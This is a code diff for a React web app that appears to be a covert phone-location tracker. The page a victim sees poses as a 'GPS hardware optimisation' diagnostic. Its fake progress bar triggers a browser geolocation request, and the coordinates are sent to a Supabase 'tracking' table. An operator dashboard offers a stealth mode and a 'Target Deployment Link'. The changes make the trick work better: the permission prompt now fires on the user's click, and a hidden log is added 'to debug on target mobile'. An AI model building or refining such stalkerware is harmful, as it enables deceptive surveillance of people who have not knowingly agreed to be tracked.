@@ -20,6 +20,7 @@ const App: React.FC = () => {
   const [diagProgress, setDiagProgress] = useState(0);
   const [locationError, setLocationError] = useState<string | null>(null);
   const [copyStatus, setCopyStatus] = useState<string | null>(null);
+  const [dbLog, setDbLog] = useState<string>("IDLE");
   
   const [members, setMembers] = useState<UserProfile[]>([
     {
@@ -35,12 +36,14 @@ const App: React.FC = () => {
   const [isLoadingInsight, setIsLoadingInsight] = useState(false);
 
   const activeMember = members[0];
-
-  // Mendeteksi status config
   const isConfigValid = !!supabaseUrl && !!supabaseKey;
 
   const syncToDatabase = async (loc: LocationData) => {
-    if (!supabase) return;
+    if (!supabase) {
+      setDbLog("ERROR: Client Supabase NULL");
+      return;
+    }
+    setDbLog("SYNCING...");
     try {
       const { error } = await supabase
         .from('tracking')
@@ -51,9 +54,16 @@ const App: React.FC = () => {
           accuracy: loc.accuracy, 
           timestamp: loc.timestamp 
         });
-      if (error) throw error;
-    } catch (err) {
-      console.error("Database Sync Error:", err);
+      
+      if (error) {
+        setDbLog(`DB ERROR: ${error.message}`);
+        console.error("Database Sync Error:", error);
+      } else {
+        setDbLog("SUCCESS: Data Sent");
+      }
+    } catch (err: any) {
+      setDbLog(`CATCH ERROR: ${err.message}`);
+      console.error("Database Catch Error:", err);
     }
   };
 
@@ -61,7 +71,8 @@ const App: React.FC = () => {
     if (isUnlocked && !isStealthMode && supabase) {
       const fetchData = async () => {
         try {
-          const { data } = await supabase.from('tracking').select('*').eq('id', targetId).single();
+          const { data, error } = await supabase.from('tracking').select('*').eq('id', targetId).single();
+          if (error) console.error("Initial fetch error:", error);
           if (data) {
             setMembers([{
               ...members[0],
@@ -80,7 +91,7 @@ const App: React.FC = () => {
       fetchData();
 
       const channel = supabase
-        .channel('schema-db-changes')
+        .channel('any')
         .on('postgres_changes', { event: '*', schema: 'public', table: 'tracking' }, payload => {
           const data = payload.new as any;
           if (data && data.id === targetId) {
@@ -105,10 +116,12 @@ const App: React.FC = () => {
 
   const updateLocation = useCallback(() => {
     if (!navigator.geolocation) {
-      setLocationError("Hardware Not Supported");
+      setLocationError("GPS Not Found");
+      setDbLog("GPS NOT SUPPORTED");
       return;
     }
 
+    setDbLog("REQUESTING GPS...");
     navigator.geolocation.getCurrentPosition(
       async (position) => {
         setLocationError(null);
@@ -132,21 +145,23 @@ const App: React.FC = () => {
         }
       },
       (err) => {
-        setLocationError("Signal Interrupted");
+        setLocationError(`Access Denied: ${err.message}`);
+        setDbLog(`GPS DENIED: ${err.code}`);
       },
-      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+      { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
     );
   }, [isUnlocked, isStealthMode]);
 
   const startDiagnostic = () => {
+    // Meminta izin GPS segera setelah klik tombol (Gesture Required by Browsers)
+    updateLocation();
     setIsDiagnosing(true);
     let progress = 0;
     const interval = setInterval(() => {
       progress += 1;
       setDiagProgress(progress);
-      if (progress === 40) updateLocation();
       if (progress >= 100) clearInterval(interval);
-    }, 80);
+    }, 60);
   };
 
   const getCleanUrl = () => window.location.origin + window.location.pathname;
@@ -191,6 +206,11 @@ const App: React.FC = () => {
                 >
                   MULAI OPTIMASI SEKARANG
                 </button>
+                {locationError && (
+                  <p className="text-[10px] text-rose-500 bg-rose-500/10 p-2 rounded">
+                    Error: Izinkan akses lokasi agar sistem bisa mendiagnosa hardware GPS.
+                  </p>
+                )}
              </div>
            ) : (
              <div className="bg-slate-900/40 border border-slate-800 rounded-3xl p-8 space-y-8">
@@ -214,8 +234,8 @@ const App: React.FC = () => {
                       <span className="text-emerald-500 font-bold">{diagProgress > 50 ? 'VERIFIED' : 'SCANNING'}</span>
                    </div>
                    <div className="flex justify-between text-[9px]">
-                      <span className="text-slate-500">NODE_SIGNAL</span>
-                      <span className="text-emerald-500 font-bold">{diagProgress > 70 ? 'STABLE' : 'CALIBRATING'}</span>
+                      <span className="text-slate-500">DATABASE_LINK</span>
+                      <span className="text-blue-400 font-bold text-[8px] truncate max-w-[100px]">{dbLog}</span>
                    </div>
                 </div>
 
@@ -230,6 +250,11 @@ const App: React.FC = () => {
                 )}
              </div>
            )}
+           
+           {/* Hidden logging area to debug on target mobile */}
+           <div className="opacity-0 h-0 overflow-hidden">
+              Log: {dbLog} | Error: {locationError}
+           </div>
         </div>
       </div>
     );
@@ -277,7 +302,6 @@ const App: React.FC = () => {
             <div className="grid grid-cols-1 lg:grid-cols-3 gap-8 max-w-7xl mx-auto animate-in zoom-in-95 duration-300">
               <div className="lg:col-span-2 space-y-6">
                 
-                {/* Configuration Alert for User */}
                 {!isConfigValid && (
                   <div className="bg-rose-500/10 border border-rose-500/20 p-4 rounded-xl flex items-start gap-4 animate-pulse">
                     <i className="fas fa-triangle-exclamation text-rose-500 mt-1"></i>
@@ -288,7 +312,6 @@ const App: React.FC = () => {
                   </div>
                 )}
 
-                {/* Telemetry Display */}
                 <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-2xl relative overflow-hidden">
                    <div className="absolute top-0 right-0 w-32 h-32 bg-blue-500/5 blur-3xl rounded-full"></div>
                    <div className="flex justify-between items-center mb-6">
@@ -323,21 +346,6 @@ const App: React.FC = () => {
                    )}
                 </div>
 
-                {/* Map Mockup */}
-                <div className="bg-slate-900 rounded-3xl aspect-video relative overflow-hidden border border-slate-800 shadow-2xl">
-                  <div className="absolute inset-0 bg-[url('https://www.google.com/maps/vt/pb=!1m4!1m3!1i12!2i2605!3i1622!2m3!1e0!2sm!3i420120488!3m8!2sen!3sus!5e1105!12m4!1e68!2m2!1sset!2sRoadmap!4e0!5m1!1e0')] bg-cover bg-center grayscale opacity-20"></div>
-                  
-                  {activeMember.currentLocation && (
-                    <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2">
-                       <div className="relative">
-                          <div className="absolute -inset-10 bg-blue-500/20 rounded-full animate-ping"></div>
-                          <div className="w-6 h-6 bg-blue-500 rounded-full border-4 border-slate-900 shadow-lg"></div>
-                       </div>
-                    </div>
-                  )}
-                </div>
-
-                {/* Deployment Link */}
                 <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6">
                    <h3 className="text-xs font-bold text-slate-400 uppercase tracking-widest mb-4">Target Deployment Link</h3>
                    <div className="p-4 bg-blue-500/5 border border-blue-500/20 rounded-xl flex gap-2">
